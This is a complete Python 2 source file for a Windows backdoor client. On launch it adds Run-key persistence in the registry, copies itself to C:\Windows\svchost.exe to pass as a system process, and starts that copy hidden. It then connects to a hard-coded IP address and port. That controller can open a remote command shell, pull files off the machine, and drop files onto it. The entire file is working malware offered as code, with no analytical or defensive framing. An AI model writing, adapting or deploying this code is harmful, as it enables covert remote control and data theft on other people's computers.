#-*- coding: utf-8 -*
import socket
import os
import time
import struct
import win32api


class Client:
    def __init__(self,ip,port):
        self.addr = ip,port
        print "[+]Init Successfully..."

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect(self.addr)
                print "[+]Connect Successfully..."
                break
            except Exception as e:
                self.sock.close()
                print "[-]Waiting:"+str(e)
                time.sleep(5)


    def check(self):
        while True:
            try:
                getcmd = self.sock.recv(1024)
                if getcmd == "shell":
                    self.shell()
                elif getcmd == "download":
                    self.filesend()
                elif getcmd == "upload":
                    self.filerecv()
                elif getcmd == "close":
                    self.close()
                elif getcmd == "end":
                    self.close()
                    self.end()
                    return 1
                else:
                    self.sock.sendall(" ")
            except Exception as e:
                print "[-]Failed:"+str(e)
                break


    def filesend(self,filepath=""):
        print "[+]FileSend:Start"
        if not filepath:
            filepath = self.sock.recv(1024)
        if os.path.isfile(filepath):
            struct.calcsize("128sI")
            filehead = struct.pack('128sI',os.path.basename(filepath),os.stat(filepath).st_size)
            self.sock.sendall(filehead)
            fp = open(filepath,"rb")
            while True:
                data = fp.read(1024)
                if not data:
                    break
                self.sock.sendall(data)
            fp.close()
            print "[+]Uploaded:"+filepath
        else:
            self.sock.sendall(filepath+":File Not Exist")
            print "[-]"+filepath+":File Not Exist"
        print "[+]FileSend:Exit"




    def filerecv(self):
        print "[+]FileRecv:Start"
        fileinfo_size = struct.calcsize("128sI")
        filehead = self.sock.recv(fileinfo_size)
        filename,filesize = struct.unpack("128sI",filehead)
        filename = filename.strip('\00')
        fp = open("E:\\" + filename,'wb')
        recved_size = 0
        while not recved_size == filesize:
            if filesize - recved_size > 1024:
                data = self.sock.recv(1024)
                recved_size += len(data)
            else:
                data = self.sock.recv(filesize - recved_size)
                recved_size = filesize
            fp.write(data)
        fp.close()
        print "[+]Downloaded:" + filename
        self.sock.sendall("[+]Uploaded"+filename)
        print "[+]FileRecv:Exit"


    def shell(self):
        self.sock.sendall("shell")
        print "[+]Shell:Start"
        while True:
            cmd = self.sock.recv(1024)
            if not cmd == "exit":
                proc = os.popen(cmd)
                output = proc.read()
                total = len(output)
                if not total:
                    output = "[+]No output"
                    total = len(output)
                self.sock.sendall(str(total))
                time.sleep(1)
                recv_size = 0
                while not total == recv_size:
                    if total - recv_size > 1024:
                        self.sock.sendall(output[recv_size:recv_size + 1023])
                        recv_size += 1024
                    else:
                        self.sock.sendall(output[recv_size:])
                        break
            else:
                print "[+]Shell:Exit"
                break


    def close(self):
        self.sock.close()


    def register(self):
        try:
            cmd = r"""echo YES|reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d C:\Windows\svchost.exe" """
            proc = os.popen(cmd)
            print proc.read()
            cmd = r"""echo YES|reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d "C:\Windows\svchost.exe" """
            proc = os.popen(cmd)
            print proc.read()
            cmd = "copy client.exe C:\\Windows\\svchost.exe "
            proc = os.popen(cmd)
            print proc.read()
            if not os.path.exists("C:\\Windows\\logs.axv"):
                open("C:\\Windows\\logs.axv","w").close()
                cmd = r"""C:\Windows\svchost.exe"""
                win32api.ShellExecute(0,'open',cmd,'','',0)
        except Exception as e:
            print str(e)

    def end(self):
        cmd = r"""taskkill /F /FI "USERNAME eq Administrator" /IM client.exe"""
        os.popen(cmd)



def main():
    cc = Client('120.78.136.136',12315)
    cc.register()

    while True:
        cc.connect()
        if cc.check() == 1:
            return


if __name__ == '__main__':
    main()

